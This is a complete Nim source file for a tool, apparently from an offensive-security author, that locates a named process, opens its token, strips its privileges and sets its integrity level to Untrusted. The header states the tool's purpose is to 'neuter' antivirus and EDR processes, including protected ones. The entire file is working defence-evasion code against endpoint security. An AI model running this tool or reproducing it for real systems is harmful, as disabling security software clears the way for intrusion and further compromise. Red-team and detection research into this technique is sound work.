#[

    Author: Marcello Salvati, Twitter: @byt3bl33d3r
    License: BSD 3-Clause

    This effectively sandboxes a process by removing it's token privileges and setting it's integrity level to "Untrusted".
    The primary use case of this would be to run it against an AV/EDR process to neuter it even if it's a PPL process.

    References:
        - https://elastic.github.io/security-research/whitepapers/2022/02/02.sandboxing-antimalware-products-for-fun-and-profit/article/
        - https://github.com/pwn1sher/KillDefender
]#

from os import paramStr, commandLineParams
from system import quit
import winim
import std/strformat

proc toString(chars: openArray[WCHAR]): string =
    result = ""
    for c in chars:
        if cast[char](c) == '\0':
            break
        result.add(cast[char](c))

proc setDebugPrivs(): bool = 
    var
        currentToken: HANDLE
        currentDebugValue: LUID
        newTokenPrivs: TOKEN_PRIVILEGES
        adjustSuccess: WINBOOL

    if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY, addr currentToken) == FALSE:
        echo &"[-] Failed to open current process token [Error: {GetLastError()}]"
        return false

    if LookupPrivilegeValue(NULL, SE_DEBUG_NAME, addr currentDebugValue) == FALSE:
        echo &"[-] Failed to lookup current debug privilege [Error: {GetLastError()}]"
        CloseHandle(currentToken)
        return false

    newTokenPrivs.PrivilegeCount = 1
    newTokenPrivs.Privileges[0].Luid = currentDebugValue
    newTokenPrivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED

    adjustSuccess = AdjustTokenPrivileges(
        currentToken,
        FALSE, 
        addr newTokenPrivs, 
        cast[DWORD](sizeof(newTokenPrivs)), 
        NULL, 
        NULL
    )

    if adjustSuccess == FALSE or GetLastError() != ERROR_SUCCESS:
        echo &"[-] Failed to set debug privileges on current process [Error: {GetLastError()}]"
        CloseHandle(currentToken)
        return false

    echo "[+] Successfully set debug privs on current process"
    return true

proc getPid(procname: string): int =
    var 
        entry: PROCESSENTRY32
        hSnapshot: HANDLE

    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    defer: CloseHandle(hSnapshot)

    if Process32First(hSnapshot, addr entry):
        while Process32Next(hSnapshot, addr entry):
            if entry.szExeFile.toString == procname:
                var proc_pid = int(entry.th32ProcessID)
                echo("[+] Got target proc PID: ", proc_pid);
                return proc_pid

    return 0

proc SetPrivilege(hToken: HANDLE; lpszPrivilege: LPCTSTR; bEnablePrivilege: BOOL): bool =
    var tp: TOKEN_PRIVILEGES
    var luid: LUID

    var lookupPriv: BOOL = LookupPrivilegeValue(NULL, lpszPrivilege, addr(luid))
    if not bool(lookupPriv):
        echo("[-] LookupPrivilegeValue Error: ", GetLastError())
        return false

    tp.PrivilegeCount = 1
    tp.Privileges[0].Luid = luid
    if bEnablePrivilege:
        tp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED
    else:
        tp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED

    ##  Enable the privilege or disable all privileges.
    var adjustToken: BOOL = AdjustTokenPrivileges(
        hToken,
        FALSE,
        addr(tp),
        cast[DWORD](sizeof(TOKEN_PRIVILEGES)),
        NULL,
        NULL
    )
    if not bool(adjustToken):
        echo("[-] AdjustTokenPrivileges error: ", GetLastError())
        return false

    if GetLastError() == ERROR_NOT_ALL_ASSIGNED:
        echo("[-] The token does not have the specified privilege")
        return false

    return true

when isMainModule:
    if len(commandLineParams()) == 0:
        echo "Usage: sandbox_process.exe [target process name]"
        quit(1)

    var sedebugnameValue: LUID

    discard setDebugPrivs()

    var pid: int = getPid(paramStr(1))
    if not bool(pid):
        echo(&"[-] Wasn't able to find process '{paramStr(1)}' PID")

    var phandle: HANDLE = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, cast[DWORD](pid))
    if phandle != INVALID_HANDLE_VALUE:
        echo(&"[*] Opened Target Handle [{phandle}]")
    else:
        echo("[-] Failed to open Process Handle")

    var ptoken: HANDLE
    var token: BOOL = OpenProcessToken(phandle, TOKEN_ALL_ACCESS, addr(ptoken))
    if token:
        echo(&"[*] Opened Target Token Handle [{ptoken}]")
    else:
        echo(&"[-] Failed to open Token Handle: {GetLastError()}")

    LookupPrivilegeValue(
        NULL,
        SE_DEBUG_NAME,
        addr(sedebugnameValue)
    )

    var tkp: TOKEN_PRIVILEGES
    tkp.PrivilegeCount = 1
    tkp.Privileges[0].Luid = sedebugnameValue
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
    
    var tokenPrivs: BOOL = AdjustTokenPrivileges(
        ptoken,
        FALSE,
        addr(tkp),
        cast[DWORD](sizeof(tkp)),
        NULL,
        NULL
    )
    if not bool(tokenPrivs):
        echo(&"[-] Failed to Adjust Token's Privileges [{GetLastError()}]")
        quit(1)


    #[
        Explicitly removing the tokens might be overkill? just calling SetTokenInformation() and setting the integrity to "Untrusted"
        seems to disable all of the important token privileges automatically with the same desired outcome of "sandboxing" the remote process. 

        Not exactly sure if there's any benifit of stripping the token vs just disabling it.
    ]#
    discard SetPrivilege(ptoken, SE_DEBUG_NAME, TRUE)
    discard SetPrivilege(ptoken, SE_CHANGE_NOTIFY_NAME, TRUE)
    discard SetPrivilege(ptoken, SE_TCB_NAME, TRUE)
    discard SetPrivilege(ptoken, SE_IMPERSONATE_NAME, TRUE)
    discard SetPrivilege(ptoken, SE_LOAD_DRIVER_NAME, TRUE)
    discard SetPrivilege(ptoken, SE_RESTORE_NAME, TRUE)
    discard SetPrivilege(ptoken, SE_BACKUP_NAME, TRUE)
    discard SetPrivilege(ptoken, SE_SECURITY_NAME, TRUE)
    discard SetPrivilege(ptoken, SE_SYSTEM_ENVIRONMENT_NAME, TRUE)
    discard SetPrivilege(ptoken, SE_INCREASE_QUOTA_NAME, TRUE)
    discard SetPrivilege(ptoken, SE_TAKE_OWNERSHIP_NAME, TRUE)
    discard SetPrivilege(ptoken, SE_INC_BASE_PRIORITY_NAME, TRUE)
    discard SetPrivilege(ptoken, SE_SHUTDOWN_NAME, TRUE)
    discard SetPrivilege(ptoken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE)
    echo("[*] Removed All Privileges")

    var integrityLevel: DWORD = SECURITY_MANDATORY_UNTRUSTED_RID

    var integrityLevelSid: SID
    integrityLevelSid.Revision = SID_REVISION
    integrityLevelSid.SubAuthorityCount = 1
    integrityLevelSid.IdentifierAuthority.Value[5] = 16
    integrityLevelSid.SubAuthority[0] = integrityLevel

    var tIntegrityLevel: TOKEN_MANDATORY_LABEL
    tIntegrityLevel.Label.Attributes = SE_GROUP_INTEGRITY
    tIntegrityLevel.Label.Sid = addr(integrityLevelSid)

    # TokenIntegrityLevel symbol was renamed to tokenIntegrityLevel in winim
    var tokenInfo = SetTokenInformation(
        ptoken, 
        tokenIntegrityLevel,
        addr(tIntegrityLevel), 
        cast[DWORD](sizeof(TOKEN_MANDATORY_LABEL) + GetLengthSid(addr(integrityLevelSid)))
    )

    if not bool(tokenInfo):
        echo("[-] SetTokenInformation failed")
    else:
        echo("[*] Token Integrity set to Untrusted")

    CloseHandle(ptoken)
    CloseHandle(phandle)
